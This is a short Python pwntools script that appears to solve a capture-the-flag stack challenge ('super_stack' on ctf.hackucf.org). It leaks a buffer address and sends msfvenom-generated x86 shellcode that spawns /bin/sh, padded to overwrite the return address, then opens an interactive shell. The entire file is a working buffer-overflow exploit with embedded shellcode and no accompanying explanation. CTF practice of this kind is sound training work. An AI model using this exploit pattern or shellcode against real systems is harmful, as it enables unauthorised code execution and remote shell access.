from pwn import *

def main():
    #r = process("./super_stack")
    r = remote("ctf.hackucf.org",9005)
    r.recvuntil("buf: ")
    buff = int(r.recvline().strip(),16)

    # shellcode 32 bit masuk scanf
    # msfvenom -f python -p linux/x86/exec CMD=/bin/sh --platform linux -b '\x00\x0a\x0c\x0b\xa0'
    buf =  ""
    buf += "\x31\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
    buf += "\x76\x0e\xac\xd1\x7c\x44\x83\xee\xfc\xe2\xf4\xc6\xda"
    buf += "\x24\xdd\xfe\xb7\x14\x69\xcf\x58\x9b\x2c\x83\xa2\x14"
    buf += "\x44\xc4\xfe\x1e\x2d\xc2\x58\x9f\x16\x44\xd9\x7c\x44"
    buf += "\xac\xfe\x1e\x2d\xc2\xfe\x0f\x2c\xac\x86\x2f\xcd\x4d"
    buf += "\x1c\xfc\x44"

    offset = 112

    p = ""
    p += buf
    p += "A" * (offset - len(buf))
    p += p32(buff)

    print(hex(buff))
    r.sendline(p)
    r.interactive()

if __name__ == "__main__":
    main()
